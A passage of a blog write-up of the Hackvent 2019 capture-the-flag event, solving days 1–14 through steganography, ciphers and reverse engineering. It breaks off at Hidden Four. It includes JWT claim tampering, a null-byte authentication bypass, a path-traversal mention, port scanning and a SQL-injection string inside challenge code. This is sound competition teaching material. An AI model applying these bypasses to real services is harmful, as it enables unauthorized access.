---
title: Write-up Hackvent 2019
date: 2020-01-01
description: Like the past few years, the HackingLab Team provided the white-hat hacking competition Hackvent in the form of a advent calendar. From December 1^(st) to 24^(th) , each day, a new challenge was released that has to be solved in-time for scoring full points. Like the past years, challenges were provided from various community members.
draft: false
tags:
  - General
  - Hacks
  - writeup
toc: false
authors: [HomeSen]
---

# Write-up: Hackvent 2019

![](./header.png)

Like the past few years, the HackingLab Team provided the white-hat
hacking competition Hackvent in the form of a advent calendar. From
December 1^(st) to 24^(th) , each day, a new challenge was released that
has to be solved in-time for scoring full points. Like the past years,
challenges were provided from various community members.

## HV19.01 censored

> I got this little image, but it looks like the best part got censored
> on the way. Even the tiny preview icon looks clearer than this! Maybe
> they missed something that would let you restore the original content?

![](https://academy.hacking-lab.com/api/media/challenge/jpg/f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg)

The first challenge was a JPEG image with a burred QR code inside.
Investigating the file with exiftool, one can see that it contains a
thumbnail:

``` brush:
$ exiftool f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg
ExifTool Version Number         : 10.36
File Name                       : f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg
Directory                       : .
File Size                       : 43 kB
File Modification Date/Time     : 2019:12:01 13:36:00+00:00
File Access Date/Time           : 2019:12:01 13:36:00+00:00
File Creation Date/Time         : 2019:12:01 13:35:59+00:00
File Permissions                : rw-rw-rw-
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Image Description               : Censored by Santa!
X Resolution                    : 300
Y Resolution                    : 300
Resolution Unit                 : inches
Software                        : GIMP 2.10.12
Modify Date                     : 2019:12:24 00:00:00
User Comment                    : Censored by Santa!
Compression                     : JPEG (old-style)
Photometric Interpretation      : YCbCr
Samples Per Pixel               : 3
Thumbnail Offset                : 332
Thumbnail Length                : 5336
Comment                         : Censored by Santa!
Image Width                     : 256
Image Height                    : 256
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 256x256
Megapixels                      : 0.066
Thumbnail Image                 : (Binary data 5336 bytes, use -b option to extract)
```

This thumbnail image can be extracted with the following command:

``` brush:
$ exiftool -a -b -W %d%f_%t%-c.%s -preview:all f182d5f0-1d10-4f0f-a0c1-7cba0981b6da.jpg
```

![](./f182d5f0-1d10-4f0f-a0c1-7cba0981b6da_ThumbnailImage.jpg)

Since zbarimg still couldn’t detect the QR code, it was cut out of the
thumbnail and a white frame was added around it:

``` brush:
$ zbarimg ThumbnailImage.png
QR-Code:HV19{just-4-PREview!}
scanned 1 barcode symbols from 1 images in 0.062 seconds
```

## HV19.02 Triangulation

> Today we give away decorations for your Christmas tree. But be careful
> and do not break it.

The provided .zip archive contained an .stl file of a christmas ball.
Inspecting the file inside a 3D viewer, it became apparent that the ball
was hollow and contained another model inside. With the help of blender,
the outer hulls have been removed, and a rendering of the object was
exported (and post-processed with Paint.net):

[![](./hv19_blender_export-296x300.png)](./hv19_blender_export.png)

The resulting AZTEC code decoded to the next flag:
`HV19{Cr4ck_Th3_B411!}`

## HV19.03 Hodor, Hodor, Hodor

[![](./hv19.03.png)](./hv19.03.png)

The challenge text is actually source code for the (esoteric) Hodor
programming language, running the code on [Try it
online](https://tio.run/#hodor), yields the following output:

``` brush:
Awesome, you decoded Hodors language! 

As sis a real h4xx0r he loves base64 as well.

SFYxOXtoMDFkLXRoMy1kMDByLTQyMDQtbGQ0WX0=
```

Decoding the Base64-encoded string yields the third flag:

``` brush:
$ echo SFYxOXtoMDFkLXRoMy1kMDByLTQyMDQtbGQ0WX0= | base64 -d
HV19{h01d-th3-d00r-4204-ld4Y}
```

## HV19.04 password policy circumvention

> Santa released a new password policy (more than 40 characters, upper,
> lower, digit, special).
>
> The elves can’t remember such long passwords, so they found a way to
> continue to use their old (bad) password:
>
> merry christmas geeks

The provided .zip archive contains an AutoHotKey script that
automatically mutates text while entering it:

``` brush:
::merry::
FormatTime , x,, MM MMMM yyyy
SendInput, %x%{left 4}{del 2}+{right 2}^c{end}{home}^v{home}V{right 2}{ASC 00123}
return

::christmas::
SendInput HV19-pass-w0rd
return

:*?:is::
Send - {del}{right}4h

:*?:as::
Send {left 8}rmmbr{end}{ASC 00125}{home}{right 10}
return

:*?:ee::
Send {left}{left}{del}{del}{left},{right}e{right}3{right 2}e{right}{del 5}{home}H{right 4}
return

:*?:ks::
Send {del}R3{right}e{right 2}3{right 2} {right 8} {right} the{right 3}t{right} 0f{right 3}{del}c{end}{left 5}{del 4}
return

::xmas::
SendInput, -Hack-Vent-Xmas
return

::geeks::
Send -1337-hack
return
```

Loading the script into AHK and starting to type the above password:
`merry christmas geeks `into e.g. Notepad, yields the next flag:
`HV19{R3memb3r, rem3mber - the 24th 0f December}`

## HV19.05 Santa Parcel Tracking

> To handle the huge load of parcels Santa introduced this year a parcel
> tracking system. He didn’t like the black and white barcode, so he
> invented a more solemn barcode. Unfortunately the common barcode
> readers can’t read it anymore, it only works with the pimped models
> santa owns. Can you read the barcode

[![](./157de28f-2190-4c6d-a1dc-02ce9e385b5c.png)](./157de28f-2190-4c6d-a1dc-02ce9e385b5c.png)

Each bar inside the barcode is colored. Reading each bar’s RGB value and
converting each component’s value to ASCII, yields the string:
`sPXtY8lPYmEIr1Oy3FsP0eQZg8Pz94uLShT8eGHz0VaX1g09lO{tODlJ1gJfxIfzIigUcjSuiHliQtv6_v0tsMosI_aQgiI3e4twS_b9atE_uGSh4Pa8TlN_qVRcV3lPaf6dq5erGrcO}wXSfL1q00vV9eW0nJOgWMx2Ze3Ek20o3EaS3lRNtUFy8PvB6eBE`

Upon closer inspection, one can see that starting from the 38th index,
every 3rd character can be used to restore the flag:
`HV19{D1fficult_to_g3t_a_SPT_R3ader}`

Since this is rather tedious when being done by hand, the following
Python script (with manually determined scan points) can be used:

``` brush:
#!/usr/bin/env python

from PIL import Image
import codecs

bars = [ 30, 39, 48, 63, 78, 84, 96, 102, 117, 129, 135, 153, 162, 174, 189, 195, 204, 219, 228, 237, 249, 261, 270, 285, 294, 303, 321, 327, 333, 345, 360, 369, 381, 393, 399, 417, 426, 438, 453, 459, 471, 477, 492, 501, 519, 525, 534, 549, 558, 573, 582, 591, 603, 618, 624, 642, 648, 657, 669, 678, 690, 705, 717, 723 ]
img = Image.open('157de28f-2190-4c6d-a1dc-02ce9e385b5c.png')
code = ''

for x in bars:
  r,g,b = img.getpixel((x,0))
  code += chr(r)
  code += chr(g)
  code += chr(b)
  
print(code + '\n') # sPXtY8lPYmEIr1Oy3FsP0eQZg8Pz94uLShT8eGHz0VaX1g09lO{tODlJ1gJfxIfzIigUcjSuiHliQtv6_v0tsMosI_aQgiI3e4twS_b9atE_uGSh4Pa8TlN_qVRcV3lPaf6dq5erGrcO}wXSfL1q00vV9eW0nJOgWMx2Ze3Ek20o3EaS3lRNtUFy8PvB6eBE

real_code = ''
for i in range(0, 103, 3):
  real_code += code[38+i]
print(real_code) # HV19{D1fficult_to_g3t_a_SPT_R3ader}
```

## HV19.06 bacon and eggs

[![](./hv19.06.png)](./hv19.06.png)

The text about Francis Bacon contains regular and *italic* characters
which indicates that the Bacon cipher was used. Loading the text into
Microsoft Word the following VBA Macro can be used to easily extract the
actual cipher text:

``` brush:
Private Sub Document_Open()
    Dim myP As Range
    Dim i As Integer
    Dim result As String
    result = ""
    
    Set myP = Me.Paragraphs.First.Range
    For i = 1 To myP.Characters.Count
        If myP.Characters(i).Text <> " " And myP.Characters(i).Text <> "," And myP.Characters(i).Text <> "." And myP.Characters(i).Text <> "-" Then
            If myP.Characters(i).Italic Then
                result = result & "B"
            Else
                result = result & "A"
            End If
        End If
    Next
    
    Me.Paragraphs.Add
    Me.Paragraphs.Last.Range.Text = result
    
End Sub
```

This results in a second paragraph being added, with the following
content:

``` brush:
BAABAAAAAAABBABBAABBAAAAAABABBABAAAABABAAABAABAABAAABBBABAAABAABAAAAABAAAAAAAABAABBBAABBABAAAABBABAABAABBAAAAAABABBBAABAABBBABAABBAABBBABAAABAABAAAAABAAAAAAAABAABBBAABBABBAABBAABBBAABAAABBBBAAAAABAABABAABABABBAABBBABAAABAAABBABAAABAABAAABBBBABABBABBBAAAABAAAAAAAABAABBBAABBABAAABAABAAAABBBBAABBBAABAABAAABABAAABAABABAABAABAAAABBAAABBBBABABBAABAAAAAABBABAABAABBAAABAABBBAABBBAABABBBABBBBAAABAABAAABBBBABABBAAAAAAAABAAABAABABBBBABBAABAAABAABBAABBBAAAABBAAABAAAAAAAABAABABAAABAABAABBBAABAAAAAAABBABAAABBBABAABAABAAABAABABAAABBBBABBBBAABAABAAABAAABAAAAAABAABAAABAAAABABABBBABAAABAAAAAABABBABABBAAABAAABBBAAAAABAAABAAAAAAAABABAABBAABAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Which the decodes to:
`SANTA LIKES HIS BACON BUT ALSO THIS BACON THE PASSWORD IS HVXBACONCIPHERISSIMPLEBUTCOOLX REPLACE X WITH BRACKETS AND USE UPPER CASE FOR ALL CHARACTER`
and finally, the next flag: `HV19{BACONCIPHERISSIMPLEBUTCOOL}`

## HV19.H1 Hidden One

> Sometimes, there are hidden flags. Got your first?

On day number 6, the first challenge was released. Below the text about
Francis Bacon, another message was hidden inside the fact sheet:

``` brush:
Born: January 22                                                  
Died: April 9                                                 
Mother: Lady Anne                                             
Father: Sir Nicholas                                                          
Secrets: unknown                                                  
```

Making the white-space characters visible, one can see where the secret
text is hidden:

[![](./hv19.h1.png)](./hv19.h1.png)

After some trial&error, one will see that the text is hidden using SNOW.
Using the according commandline tool, the first hidden flag gets
revealed:

``` brush:
C:\workspace\_Wargames\Hackvent 2019\h1>SNOW.EXE -C 06.txt
HV19{1stHiddenFound}
```

## HV19.07 Santa Rider

> Santa is prototyping a new gadget for his sledge. Unfortunately it
> still has some glitches, but look for yourself.

At first, the attached video shows a running light. But in the middle,
it starts showing random patterns, e.g:

[![](./img-0274-1024x576.jpeg)](./img-0274.jpeg)

Using ffmpeg to extract all single images/frames of the video, it
becomes apparent that binary encoded characters are shown:

``` brush:
$ ffmpeg -i 3DULK2N7DcpXFg8qGo9Z9qEQqvaEDpUCBB1v.mp4 -r 30 imgs/img-%04d.jpeg
```

After removing duplicates, flag number 7 can be manually decoded:
`HV19{1m_als0_w0rk1ng_0n_a_r3m0t3_c0ntr0l}`

## HV19.H2 Hidden Two

> Again a hidden flag.

A new day, and a new hidden flag. Looking at the video file’s name, one
might suspect that it has a deeper meaning. Feeding the file name into
[GCHQ’s CyberChef](https://gchq.github.io/CyberChef/) and selecting the
“Magic” decoder yields that it is a Base58 encoding:

[![](./HV19.h2-1024x724.png)](./HV19.h2.png)

## HV19.08 SmileNcryptor 4.0

> You hacked into the system of very-secure-shopping.com and you found a
> SQL-Dump with \$\$-creditcards numbers. As a good hacker you inform
> the company from which you got the dump. The managers tell you that
> they don’t worry, because the data is encrypted.

The provided SQL dump contains the following interesting INSERT
statements:

``` brush:
INSERT INTO `creditcards` VALUES 
(1,'Sirius Black',':)QVXSZUVY\ZYYZ[a','12/2020'),
(2,'Hermione Granger',':)QOUW[VT^VY]bZ_','04/2021'),
(3,'Draco Malfoy',':)SPPVSSYVV\YY_\\]','05/2020'),
(4,'Severus Snape',':)RPQRSTUVWXYZ[\]^','10/2020'),
(5,'Ron Weasley',':)QTVWRSVUXW[_Z`\b','11/2020');
...
INSERT INTO `flags` VALUES (1,'HV19{',':)SlQRUPXWVo\Vuv_n_\ajjce','}');
```

At first sight, it becomes apparent that the Smiley is just some sort of
“encoding-marker”. Using an [online database of “testing credit-card
numbers”](https://www.ionos.de/hilfe/websites-e-shops/ipayment-verwalten/kreditkartennummern-zum-testen-von-11-ipayment/),
one can derive that (based on their lengths) the CCNs are from American
Express, Diners Club, MasterCard or Visa, and the last one from JCB.
Furthermore, the cipher texts all start with Q, R or S, while the
respective CCNs start with 3, 4 or 5.

Taking 2 different pairs, like e.g. Q \<-\> 3 and S\<-\>5, one can see
that the encryption is not XOR-based, but rather linear (like e.g.
Caesar or Vigenere):

``` brush:
Python 3.7.3 (v3.7.3:ef4ec6ed12, Mar 25 2019, 21:26:53) [MSC v.1916 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
>>> ord('Q')^ord('3')
98
>>> ord('Q')-ord('3')
30
>>> ord('S')^ord('5')
102
>>> ord('S')-ord('5')
30
>>> ord('R')^ord('4')
102
>>> ord('R')-ord('4')
30
```

With some more fiddling around in the Python console (using the first
cipher text and both potential AMEX CCNs), the potential encryption keys
can be found and verified against another entry:

``` brush:
>>> c = b'QVXSZUVY\\ZYYZ[a'
>>> p1 = b'378282246310005'
>>> p2 = b'371449635398431'
>>> k1 = bytearray()
>>> k2 = bytearray()
>>> for a,b,c in zip(c,p1,p2):
...   k1.append(a-b)
...   k2.append(a-c)
...
>>> k1
bytearray(b'\x1e\x1f !"#$%&\'()*+,')
>>> k2
bytearray(b"\x1e\x1f\'\x1f&\x1c &\'\' !&(0")
>>> k1.hex()
'1e1f202122232425262728292a2b2c'
>>> k2.hex()
'1e1f271f261c202627272021262830'
>>> for a,b in zip(c2,k1):
...   print(chr(a-b), end='')
...
30569309025904>>>
>>> for a,b in zip(c2,k2):
...   print(chr(a-b), end='')
...
30.85:48/2=A47>>>
>>> 
```

Apparently, we are dealing with a Vigenere-like cipher that simply
starts with a key of \x1f (30), increasing by one for each
position/character. Thus, the flag number 8 could be easily found by
applying that knowledge:

``` brush:
>>> secret = b'SlQRUPXWVo\\Vuv_n_\\ajjce'
>>> flag = ''
>>> for s in secret:
...   flag += chr(s-k)
...   k += 1
...
>>> print('HV19{%s}' % flag)
HV19{5M113-420H4-KK3A1-19801}
```

## HV19.09 Santas Quick Response 3.0

> Visiting the following railway station has left lasting memories.
>
> ![](./bb374593-958a-479f-8328-79396471a7ab.jpg)
>
> Santas brand new gifts distribution system is heavily inspired by it.
> Here is your personal gift, can you extract the destination path of
> it?
>
> ![](./bd659aba-5ad2-4ad3-992c-6f99023792bc.png)

Submitting the first provided image to Google’s image search immediately
yields the [Rule-30 Wikipedia
page](https://en.wikipedia.org/wiki/Rule_30) as a top result:

[![](./hv19.09.png)](./hv19.09.png)

Looking at the QR code, one can see that the top position markers and
the encoding matrix are still intact, while the bottom left position
marker and the timing patterns are somewhat corrupted. Rule-30 defines a
fractal of triangles, so apparently, the QR code got distorted (e.g.
XOR’d) with such a triangle.

By resizing the QR code to 35×35 pixels, so that each dot in the matrix
is represented by exactly one pixel, and adding it as a new layer over a
sufficiently large Rule-30 fractal in Paint.net, both images can be
XOR’d to confirm that theory. After moving the QR code to the correct
location, an inverted but complete QR code appears:

[![](./hv19.09_2.png)](./hv19.09_2.png)

Inverting and decoding the new QR code discloses the flag for day 9:
`HV19{Cha0tic_yet-0rdered}`

## HV19.10 Guess what

> The flag is right, of course

Looking at the the provided ELF64 binary in BinaryNinja indicated that
it might be heavily obfuscated. Thus, a dynamic analysis with `ltrace`
was performed to find out how the requested input is being processed.
this already gave almost the complete flag away:

[![](./HV19.10_ltrace.png)](./HV19.10_ltrace.png)

Since it was unknown how much longer the flag might be, the binary was
loaded into GDB (with activated
[GEF](https://github.com/hugsy/gef)-plugin). At first, a breakpoint was
added at the main function’s entry, since `strlen` and `strcpy` weren’t
loaded into the binary from the very beginning. Once the breakpoint was
hit, a second breakpoint for `strlen` was added and execution was
continued. When the program entered strlen and halted, the full flag
could be found inside the memory location that is referenced by RDI
(which by convention holds the first argument on x86_64 ABI):

[![](./HV19.10_gdb-1024x902.png)](./HV19.10_gdb.png)

## HV19.11 Frolicsome Santa Jokes API

> The elves created an API where you get random jokes about santa.
>
> Go and try it
> here: [http://whale.hacking-lab.com:10101](http://whale.hacking-lab.com:10101/)

The provided link points to an API description that explains how to
register, login and retrieve (dad) jokes:

[![](./HV19.11_api-1024x795.png)](./HV19.11_api.png)

After registering and logging into the API, the following response gets
returned:

``` brush:
{
  "code": 201,
  "message": "Token generated",
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiSG9tZVNlbjEiLCJwbGF0aW51bSI6ZmFsc2V9LCJleHAiOjE1NzYwNjc5ODcuNTAyMDAwMDAwfQ.RwRRHum-H7co7HT2C2UkHdz1_ocBXpP_xU5BEWwg9As"
}
```

The token pretty much looks like a JSON Web Token, and the JOSEPH plugin
for Burp confirms this assumption:

[![](./HV19.11_jws-1024x210.png)](./HV19.11_jws.png)

Obviously, the task was to modify the token without being detected.
Attempts to remove the signature or change the signature algorithm
failed. Out of curiosity, it was then attempted to simply change the
token’s `platinum` parameter to true, which was rewarded with the next
flag:

[![](./HV19.11_repeater-1024x232.png)](./HV19.11_repeater.png)

## HV19.H3 Hidden Three

> Not each quote is compl

On day number 10, the next hidden challenge went live. Since it’s the
first day where whale.hacking-lab.com appeared, it was just natural
perform an nmap scan on that host. This revealed that TCP port 17″Quote
of the day” was open. Sending a probe to that port resulted in a single
character being sent back by the server. After some further poking
around, it became apparent that it’s rather a “Quote of the hour”
service that sends one flag character per hour. Thus, a simple cronjob
was created on a vServer to query the qotd service once per hour:

``` brush:
# m h  dom mon dow   command
1 * * * * echo "" | nc whale.hacking-lab.com 17 >> ~/hv19h3.txt
```

After ~16h, the remaining parts of the flag could be easily guessed:
`HV19{an0ther_DAILY_fl4g}`

## HV19.12 back to basic

> Santa used his time machine to get a present from the past. get your
> rusty tools out of your cellar and solve this one!

According to [CFF Explorer](https://ntcore.com/?page_id=388), the
provided PE file was compiled from Visual Basic 5.0. Using the free [VB
Decompiler Lite](https://www.vb-decompiler.org/download.htm), the most
interesting functions can be easily found (though the free version only
disassembles the P-code, instead of decompiling it to actual VB code):

[![](./hv19.12_vbdec.png)](./hv19.12_vbdec.png)

Since Ghidra produced “some” results during decompiling, it wasn’t all
that readable. So, instead a dynamic approach utilizing x64dbg was used
to find out the application’s actual behaviour. The `Text1_Change`
function is called every time, the “input changed” event gets triggered.
It then basically checks if the input length equals 33:

[![](./HV19.12_00-comapre_length_with_33.png)](./HV19.12_00-comapre_length_with_33.png)

Once the entered text has reached the according length, it checks
whether the first 4 characters correspond to “HV19” (each of these is
spread over the binary, in order to obfuscate the flag header’s
presence).

It then loops over all entered characters, adding 6 to the current index
(in VB, loops are counting from 1, not 0):

[![](./HV19.12_01-get_current_index.png)](./HV19.12_01-get_current_index.png)

Next, the current index value is XOR’d with the character value:

[![](./HV19.12_02-xor_with_index.png)](./HV19.12_02-xor_with_index.png)

And finally, the result is compared against a value inside the program’s
memory:

[![](./HV19.12_03-final_compare-1024x523.png)](./HV19.12_03-final_compare.png)

Equipped with that knowledge, flag can be easily decrypted from inside
the Python console:

[![](./HV19.12_04-solution.png)](./HV19.12_04-solution.png)

## HV19.13 TrieMe

> Switzerland’s national security is at risk. As you try to infiltrate a
> secret spy facility to save the nation you stumble upon an interesting
> looking login portal.
>
> Can you break it and retrieve the critical information?

Together with the URL to the application, the according `NotesBean` code
was provided:

``` brush:
package com.jwt.jsf.bean;
import org.apache.commons.collections4.trie.PatriciaTrie;

import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.io.StringWriter;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.SessionScoped;
import static org.apache.commons.lang3.StringEscapeUtils.unescapeJava;
import org.apache.commons.io.IOUtils;

@ManagedBean(name="notesBean")
@SessionScoped
public class NotesBean implements Serializable {

    /**
     * 
     */
    private PatriciaTrie<Integer> trie = init();
    private static final long serialVersionUID = 1L;
    private static final String securitytoken = "auth_token_4835989";

    public NotesBean() {
        super();
        init();
    }

    public String getTrie() throws IOException {
        if(isAdmin(trie)) {
            InputStream in=getStreamFromResourcesFolder("data/flag.txt");
            StringWriter writer = new StringWriter();
            IOUtils.copy(in, writer, "UTF-8");
            String flag = writer.toString();

            return flag;
        }
        return "INTRUSION WILL BE REPORTED!";
    }

    public void setTrie(String note) {
        trie.put(unescapeJava(note), 0);
    }
        
    private static PatriciaTrie<Integer> init(){
        PatriciaTrie<Integer> trie = new PatriciaTrie<Integer>();
        trie.put(securitytoken,0);

        return trie;
    }

    private static boolean isAdmin(PatriciaTrie<Integer> trie){
        return !trie.containsKey(securitytoken);
    }

    private static InputStream getStreamFromResourcesFolder(String filePath) {
          return Thread.currentThread().getContextClassLoader().getResourceAsStream(filePath);
         }

}
```

From the above code, one can see that it uses a [Radix
tree](https://en.wikipedia.org/wiki/Radix_tree) (a Patricia Tree, to be
precise)to store session data. The provided input first gets unescaped
using `unescapeJava` and then checks whether the previously set
`securitytoken` is still inside that tree. If it isn’t, the flag gets
loaded from a local file. Attempts to exploit a deserialization
vulnerability failed. So, another path had to be chosen: exploit the
internal functionality of the Patricia tree to ~~delete~~ mask the
original security token.

At that point, the unescapeJava function comes into play: By submitting
`auth_token_4835989\0` to the website, the NULL character gets unescaped
and the old key gets extended by said NULL byte. That way, the original
value does no longer exist separately and the `isAdmin` check returns
true:

[![](./HV19.13_flag-1024x330.png)](./HV19.13_flag.png)

It was also found, that the JavaServer Faces version is vulnerable to
path-traversal/local-file-inclusion. Thus, the application’s web.xml
could be read:

[![](./hv19.13_LFI.png)](./hv19.13_LFI.png)

An alternative solution could thus have been reading the flag file
directly. Unfortunately, the exact path for `data/flag.txt` could not be
found/guessed 🙁

## HV19.14 Achtung das Flag

> Let’s play another little game this year. Once again, I promise it is
> hardly obfuscated.

``` brush:
use Tk;use MIME::Base64;chomp(($a,$a,$b,$c,$f,$u,$z,$y,$r,$r,$u)=<DATA>);sub M{$M=shift;##
@m=keys %::;(grep{(unpack("%32W*",$_).length($_))eq$M}@m)[0]};$zvYPxUpXMSsw=0x1337C0DE;###
/_help_me_/;$PMMtQJOcHm8eFQfdsdNAS20=sub{$zvYPxUpXMSsw=($zvYPxUpXMSsw*16807)&0xFFFFFFFF;};
($a1Ivn0ECw49I5I0oE0='07&3-"11*/(')=~y$!-=$`-~$;($Sk61A7pO='K&:P3&44')=~y$!-=$`-~$;m/Mm/g;
($sk6i47pO='K&:R&-&"4&')=~y$!-=$`-~$;;;;$d28Vt03MEbdY0=sub{pack('n',$fff[$S9cXJIGB0BWce++]
^($PMMtQJOcHm8eFQfdsdNAS20->()&0xDEAD));};'42';($vgOjwRk4wIo7_=MainWindow->new)->title($r)
;($vMnyQdAkfgIIik=$vgOjwRk4wIo7_->Canvas("-$a"=>640,"-$b"=>480,"-$u"=>$f))->pack;@p=(42,42
);$cqI=$vMnyQdAkfgIIik->createLine(@p,@p,"-$y"=>$c,"-$a"=>3);;;$S9cXJIGB0BWce=0;$_2kY10=0;
$_8NZQooI5K4b=0;$Sk6lA7p0=0;$MMM__;$_=M(120812).'/'.M(191323).M(133418).M(98813).M(121913)
.M(134214).M(101213).'/'.M(97312).M(6328).M(2853).'+'.M(4386);s|_||gi;@fff=map{unpack('n',
$::{M(122413)}->($_))}m:...:g;($T=sub{$vMnyQdAkfgIIik->delete($t);$t=$vMnyQdAkfgIIik->#FOO
createText($PMMtQJOcHm8eFQfdsdNAS20->()%600+20,$PMMtQJOcHm8eFQfdsdNAS20->()%440+20,#Perl!!
"-text"=>$d28Vt03MEbdY0->(),"-$y"=>$z);})->();$HACK;$i=$vMnyQdAkfgIIik->repeat(25,sub{$_=(
$_8NZQooI5K4b+=0.1*$Sk6lA7p0);;$p[0]+=3.0*cos;$p[1]-=3*sin;;($p[0]>1&&$p[1]>1&&$p[0]<639&&
$p[1]<479)||$i->cancel();00;$q=($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0,$p[0]-1,$p[1]-1,
$p[0]+1,$p[1]+1)||[])->[0];$q==$t&&$T->();$vMnyQdAkfgIIik->insert($cqI,'end',\@p);($q==###
$cqI||$S9cXJIGB0BWce>44)&&$i->cancel();});$KE=5;$vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>"=>sub{
$Sk6lA7p0=1;});$vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>"=>sub{$Sk6lA7p0=-1;});$vgOjwRk4wIo7_#%"
->bind("<$sk6i47pO-n>"=>sub{$Sk6lA7p0=0 if$Sk6lA7p0>0;});$vgOjwRk4wIo7_->bind("<$sk6i47pO"
."-m>"=>sub{$Sk6lA7p0=0 if $Sk6lA7p0<0;});$::{M(7998)}->();$M_decrypt=sub{'HACKVENT2019'};
__DATA__
The cake is a lie!
width
height
orange
black
green
cyan
fill
Only perl can parse Perl!
Achtung das Flag! --> Use N and M
background
M'); DROP TABLE flags; -- 
Run me in Perl!
__DATA__
```

In order to deobfuscate the above code, the deparse module can be used
as a starting point: `perl -MO=Deparse game.pl` Which results in
slightly easier digestible code:

``` brush:
sub Tk::Frame::labelPack;
sub Tk::Frame::packscrollbars;
sub Tk::Frame::sbset;
sub Tk::Frame::labelVariable;
sub Tk::Frame::AddScrollbars;
sub Tk::Frame::label;
sub Tk::Frame::freeze_on_map;
sub Tk::Frame::queuePack;
sub Tk::Frame::FindMenu;
sub Tk::Frame::scrollbars;
sub Tk::Toplevel::FG_Destroy;
sub Tk::Toplevel::FG_BindOut;
sub Tk::Toplevel::FG_Create;
sub Tk::Toplevel::FG_Out;
sub Tk::Toplevel::FG_In;
sub Tk::Toplevel::FG_BindIn;
use Tk;
use MIME::Base64;
chomp(($a, $a, $b, $c, $f, $u, $z, $y, $r, $r, $u) = readline DATA);
sub M {
    $M = shift();
    @m = keys %main::;
    (grep {unpack('%32W*', $_) . length($_) eq $M;} @m)[0];
}
$zvYPxUpXMSsw = 322420958;
/_help_me_/;
$PMMtQJOcHm8eFQfdsdNAS20 = sub {
    $zvYPxUpXMSsw = $zvYPxUpXMSsw * 16807 & 4294967295;
}
;
($a1Ivn0ECw49I5I0oE0 = '07&3-"11*/(') =~ tr/!-=/`-|/;
($Sk61A7pO = 'K&:P3&44') =~ tr/!-=/`-|/;
/Mm/g;
($sk6i47pO = 'K&:R&-&"4&') =~ tr/!-=/`-|/;
$d28Vt03MEbdY0 = sub {
    pack 'n', $fff[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
}
;
'???';
($vgOjwRk4wIo7_ = 'MainWindow'->new)->title($r);
($vMnyQdAkfgIIik = $vgOjwRk4wIo7_->Canvas("-$a", 640, "-$b", 480, "-$u", $f))->pack;
@p = (42, 42);
$cqI = $vMnyQdAkfgIIik->createLine(@p, @p, "-$y", $c, "-$a", 3);
$S9cXJIGB0BWce = 0;
$_2kY10 = 0;
$_8NZQooI5K4b = 0;
$Sk6lA7p0 = 0;
$MMM__;
$_ = M(120812) . '/' . M(191323) . M(133418) . M(98813) . M(121913) . M(134214) . M(101213) . '/' . M(97312) . M(6328) . M(2853) . '+' . M(4386);
s/_//gi;
@fff = map({unpack 'n', $main::{M 122413}($_);} /.../g);
($T = sub {
    $vMnyQdAkfgIIik->delete($t);
    $t = $vMnyQdAkfgIIik->createText(&$PMMtQJOcHm8eFQfdsdNAS20() % 600 + 20, &$PMMtQJOcHm8eFQfdsdNAS20() % 440 + 20, '-text', &$d28Vt03MEbdY0(), "-$y", $z);
}
)->();
$HACK;
$i = $vMnyQdAkfgIIik->repeat(25, sub {
    $_ = $_8NZQooI5K4b += 0.1 * $Sk6lA7p0;
    $p[0] += 3 * cos($_);
    $p[1] -= 3 * sin($_);
    $i->cancel unless $p[0] > 1 and $p[1] > 1 and $p[0] < 639 and $p[1] < 479;
    '???';
    $q = +($vMnyQdAkfgIIik->find($a1Ivn0ECw49I5I0oE0, $p[0] - 1, $p[1] - 1, $p[0] + 1, $p[1] + 1) || [])->[0];
    &$T() if $q == $t;
    $vMnyQdAkfgIIik->insert($cqI, 'end', \@p);
    $i->cancel if $q == $cqI or $S9cXJIGB0BWce > 44;
}
);
$KE = 5;
$vgOjwRk4wIo7_->bind("<$Sk61A7pO-n>", sub {
    $Sk6lA7p0 = 1;
}
);
$vgOjwRk4wIo7_->bind("<$Sk61A7pO-m>", sub {
    $Sk6lA7p0 = -1;
}
);
$vgOjwRk4wIo7_->bind("<$sk6i47pO-n>", sub {
    $Sk6lA7p0 = 0 if $Sk6lA7p0 > 0;
}
);
$vgOjwRk4wIo7_->bind("<$sk6i47pO" . '-m>', sub {
    $Sk6lA7p0 = 0 if $Sk6lA7p0 < 0;
}
);
$main::{M 7998}();
$M_decrypt = sub {
    'HACKVENT2019';
}
;
__DATA__
The cake is a lie!
width
height
orange
black
green
cyan
fill
Only perl can parse Perl!
Achtung das Flag! --> Use N and M
background
M'); DROP TABLE flags; -- 
Run me in Perl!
__DATA__
```

After some slight modifications, the script can be made to print out the
flag, without having to actually play through the game:

``` brush:
$ diff -iE deparse.pl deparse-modded.pl
36c36,38
<     pack 'n', $fff[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
---
>     $tmp = $fff[$S9cXJIGB0BWce++] ^ &$PMMtQJOcHm8eFQfdsdNAS20() & 57005;
>     print pack 'n', $tmp;
>     pack 'n', $tmp;
64a67
>     $q = $t;
```

Running the modified Perl script reveals the flag for day 14:
`HV19{s@@jSfx4gPcvtiwxPCagrtQ@,y^p-za-oPQ^a-z\x20\n^&&s[(.)(..)][\2\1]g;s%4(…)%"p$1t"%ee}`

## HV19.H4 Hidden Four

On day 14, the last hidden challenge was released without any further
